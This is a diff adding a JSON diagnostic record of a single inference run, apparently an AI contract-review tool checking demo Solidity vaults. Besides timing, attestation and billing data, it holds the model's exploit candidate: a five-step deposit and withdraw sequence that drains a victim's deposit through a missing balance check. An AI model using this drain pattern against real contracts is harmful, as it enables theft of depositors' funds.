@@ -1,0 +1,202 @@
+{
+  "schemaVersion": 1,
+  "finishedAt": "2026-11-06T10:12:40.889Z",
+  "policy": {
+    "model": "z-ai/glm-5.3-flash",
+    "runtime": "v24.22.1",
+    "sdkVersion": "0.1.0",
+    "thinkingTokenBudget": 5000,
+    "maxTokens": 8192,
+    "applicationDeadline": null,
+    "toolDeadline": null,
+    "stream": false,
+    "inferenceRetries": 0,
+    "maxInferenceRequests": 1,
+    "authorization": "Founder explicitly requested one further 5000-reasoning-token diagnostic without timeout after the previous five-attempt campaign",
+    "transport": "Official verified SDK fetch directly; no OpenAI-wrapper timeout/retry machinery",
+    "productionCodeChanged": false,
+    "e2ee": true,
+    "acceptedTcbStatuses": [
+      "UpToDate"
+    ],
+    "noAliasing": true
+  },
+  "sourceSha256s": {
+    "src/demo/VaultV2Drain.sol": "f7649c75c4fa91f851935ce096f7c9653acbe03d4ad806ef2f1cd9163a9c3192",
+    "src/demo/VaultV2Honest.sol": "6326a13660cf8e8bf9d2f45a9ee1895b0780d18c81fbf15962cea387190c1eb3"
+  },
+  "requestSha256": "511e310a2488aeafc786dd05eeb8baea4ac7503e7d9e31e528f66f02648c118b",
+  "phases": [
+    {
+      "name": "sdk_import",
+      "wallMs": 41127.255,
+      "cpuUserMs": 1501.274,
+      "cpuSystemMs": 3865.526
+    },
+    {
+      "name": "read_only_preflight",
+      "wallMs": 1542.355,
+      "cpuUserMs": 185.447,
+      "cpuSystemMs": 55.247
+    },
+    {
+      "name": "gateway_and_model_attestation",
+      "wallMs": 7065.438,
+      "cpuUserMs": 925.403,
+      "cpuSystemMs": 93.33
+    },
+    {
+      "name": "completion_request_and_decryption",
+      "wallMs": 98555.165,
+      "cpuUserMs": 347.468,
+      "cpuSystemMs": 34.554
+    },
+    {
+      "name": "response_signature_and_schema_verification",
+      "wallMs": 1188.032,
+      "cpuUserMs": 33.339,
+      "cpuSystemMs": 10.779
+    },
+    {
+      "name": "billing_lookup",
+      "wallMs": 4164.248,
+      "cpuUserMs": 19.205,
+      "cpuSystemMs": 2.263
+    }
+  ],
+  "nativeEvents": [
+    {
+      "event": "completion_native_request_created",
+      "atMs": 49864.4
+    },
+    {
+      "event": "dns_lookup_complete",
+      "atMs": 49885
+    },
+    {
+      "event": "tcp_connected",
+      "atMs": 50417.211
+    },
+    {
+      "event": "tls_connected",
+      "atMs": 50695.498
+    },
+    {
+      "event": "request_body_flushed",
+      "atMs": 50695.909
+    },
+    {
+      "event": "response_headers",
+      "atMs": 148061.79,
+      "status": 200,
+      "inferenceId": "7306491b-3d2b-5c26-9309-bfbe254966e6",
+      "supportRequestId": "d0e1ddf7-4840-425f-8a4a-86d30bbf70c4"
+    },
+    {
+      "event": "response_body_received",
+      "atMs": 148327.73
+    }
+  ],
+  "outcome": {
+    "status": "complete",
+    "finishReason": "stop",
+    "completionId": "a278f01331794ed68e741098f34aaff9",
+    "candidateCount": 1,
+    "candidates": [
+      {
+        "rule": "R2",
+        "rationale": "VaultV2Drain's stage-3 loyalty rebate withdraw zeroes the caller's recorded balance and decrements totalDeposits by that balance, but transfers the requested `amount` with no balance check — so with a victim's deposit backing the vault, a stage-3 withdraw with amount > recorded balance pays out tokens not covered by totalDeposits, leaving totalDeposits() > token.balanceOf(proxy).",
+        "steps": [
+          {
+            "from": "victim",
+            "call": "deposit(uint256)",
+            "args": [
+              "1000000000000000000"
+            ],
+            "value": "0"
+          },
+          {
+            "from": "attacker",
+            "call": "deposit(uint256)",
+            "args": [
+              "1"
+            ],
+            "value": "0"
+          },
+          {
+            "from": "attacker",
+            "call": "withdraw(uint256)",
+            "args": [
+              "1"
+            ],
+            "value": "0"
+          },
+          {
+            "from": "attacker",
+            "call": "deposit(uint256)",
+            "args": [
+              "1"
+            ],
+            "value": "0"
+          },
+          {
+            "from": "attacker",
+            "call": "withdraw(uint256)",
+            "args": [
+              "1000000000000000001"
+            ],
+            "value": "0"
+          }
+        ]
+      }
+    ],
+    "responseSha256": "3c8dec33e7f5a8fb918509500c1d53bc9fb73789cdfa936c2a4a78f8610801a5",
+    "candidateReplay": "not_run",
+    "gateVerdict": "not_issued"
+  },
+  "receipt": {
+    "signatureKind": "provider_tee",
+    "signingAlgo": "ed25519",
+    "signingAddress": "5a0210f2442c79355784f9de021985429561da5bacc3a4424b01ac52b7e0caff",
+    "signedText": "z-ai/glm-5.3-flash:4fdef23e49d839f1baebe6a63248457d871eced61d0c2b45ff1f8fcbca8bcfe5:aa64c36a213ac030f7fc07e7cb5df60bd70f90dcb8cf0c27e280016beb496870",
+    "signature": "d207d1ec253f0101502703c781601cb7dbb6b918b46a7070ccffdecd62aa7253298238b9477b9adb6252cb22c8774b9b1632c5e1bb80aae7cc47447567ffe50d",
+    "independentlyVerified": true
+  },
+  "usage": {
+    "promptTokens": 1723,
+    "completionTokens": 5208,
+    "reasoningTokens": 5001,
+    "totalTokens": 6931
+  },
+  "billing": {
+    "status": "reported",
+    "requestId": "7306491b-3d2b-5c26-9309-bfbe254966e6",
+    "costNanoUsd": 2741840,
+    "costUsd": 0.00274184
+  },
+  "measurement": {
+    "inferenceWallIncludingSetupMs": 149548.911,
+    "totalIncludingBillingMs": 153717.904,
+    "requestBodyFlushedToResponseHeadersMs": 97365.881,
+    "maxRssKiB": 153440,
+    "cpuTotalMs": 7446.866
+  },
+  "limits": [
+    "Single non-streaming request, not a throughput benchmark or latency guarantee.",
+    "Remote interval includes network, gateway/provider queue and inference; no server compute-only telemetry.",
+    "Local CPU excludes other laptop processes and is CPU time, not wall time.",
+    "SDK import can include local filesystem/module-load delays.",
+    "Provider/transport infrastructure may still impose its own limits; only application/tool deadlines are disabled.",
+    "5000 is a reasoning ceiling, not a promise of exactly 5000 generated tokens.",
+    "Production timeout remains unchanged; no solver, replay, certificate or chain write.",
+    "The legacy timeout_s=120 field remains in prompt JSON for comparability, but was not enforced; the production review() deadline wrapper was intentionally not used.",
+    "The provider reported 5001 reasoning tokens for requested budget 5000, as it previously reported 513 for requested 512; exact budget-boundary accounting is provider-reported, not locally assumed.",
+    "SDK-import wall delay was measured, but its filesystem/antivirus/scheduling cause was not isolated."
+  ],
+  "runtimeArtifact": {
+    "version": "v24.22.1",
+    "sha256": "6c172a9ab6718f7b801fb5a7bd486af2ee5e32758086a04b84fcce2aa77095e6",
+    "source": "https://nodejs.org/dist/v24.22.1/SHASUMS256.txt",
+    "checksumVerified": true
+  }
+}
